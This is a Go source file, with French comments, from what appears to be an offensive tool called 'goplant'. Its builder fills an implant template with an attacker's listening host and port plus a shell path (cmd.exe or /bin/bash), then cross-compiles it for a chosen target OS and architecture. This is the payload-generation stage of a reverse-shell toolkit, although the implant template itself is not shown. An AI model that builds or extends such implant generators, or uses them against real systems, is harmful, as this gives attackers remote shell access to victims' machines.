package builder

import (
	"fmt"
	"goplant/internal/template"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Build génère un implant en utilisant le template spécifié
func Build(tmpl *template.Template, lhost string, lport string, output string, targetOS string, arch string) error {
	// Générer le fichier source temporaire
	buildDir, sourceFile, err := generateTemp(tmpl.GetCode(), tmpl.GetFileName(), lhost, lport, targetOS)
	if err != nil {
		return fmt.Errorf("error generating temp file: %w", err)
	}
	defer os.RemoveAll(buildDir)

	fmt.Printf("Génération de l'implant pour %s:%s\n", lhost, lport)
	fmt.Printf("Fichier source généré: %s\n", sourceFile)

	// Créer le répertoire de sortie s'il n'existe pas
	outputDir := filepath.Dir(output)
	if outputDir != "." {
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			return fmt.Errorf("error creating output directory: %w", err)
		}
	}

	// Obtenir la commande de build depuis le template
	buildCmdArgs := tmpl.GetCompiler()(sourceFile, output)

	// Exécuter la commande de build
	fmt.Printf("\nExécution: %v\n", buildCmdArgs)
	buildExec := exec.Command(buildCmdArgs[0], buildCmdArgs[1:]...)
	buildExec.Stdout = os.Stdout
	buildExec.Stderr = os.Stderr

	// Définir les variables d'environnement GOOS et GOARCH
	buildExec.Env = append(os.Environ(), getOSEnv(targetOS, arch)...)

	if err := buildExec.Run(); err != nil {
		return fmt.Errorf("error compiling: %w", err)
	}

	fmt.Printf("\n✓ Implant généré avec succès: %s\n", output)
	return nil
}

// generateTemp crée un fichier temporaire avec l'extension appropriée du template
func generateTemp(templateCode string, templateFileName string, lhost string, lport string, targetOS string) (string, string, error) {
	currDir, err := os.Getwd()
	if err != nil {
		return "", "", err
	}

	buildDir, err := os.MkdirTemp(currDir, "build-*")
	if err != nil {
		return "", "", err
	}

	// Extraire l'extension du fichier template en enlevant .tmpl
	// Ex: "go_implant.go.tmpl" -> ".go"
	ext := strings.TrimSuffix(templateFileName, ".tmpl")
	ext = ext[strings.LastIndex(ext, "."):]
	pattern := "main-*" + ext

	sourceFile, err := os.CreateTemp(buildDir, pattern)
	if err != nil {
		os.RemoveAll(buildDir)
		return "", "", err
	}
	defer sourceFile.Close()

	// Déterminer le chemin de la commande shell selon l'OS cible
	shellCmd := getShellCommand(targetOS)

	// Remplacer les placeholders %s avec lhost, lport et shellCmd
	_, err = fmt.Fprintf(sourceFile, templateCode, lhost, lport, shellCmd)
	if err != nil {
		os.RemoveAll(buildDir)
		return "", "", err
	}

	return buildDir, sourceFile.Name(), nil
}

// getShellCommand retourne le chemin de la commande shell selon l'OS cible
func getShellCommand(targetOS string) string {
	if targetOS == "windows" {
		return "cmd.exe"
	}
	return "/bin/bash"
}

// getOSEnv retourne les variables d'environnement GOOS et GOARCH pour l'OS et architecture cibles
func getOSEnv(targetOS string, arch string) []string {
	return []string{
		fmt.Sprintf("GOOS=%s", targetOS),
		fmt.Sprintf("GOARCH=%s", arch),
	}
}
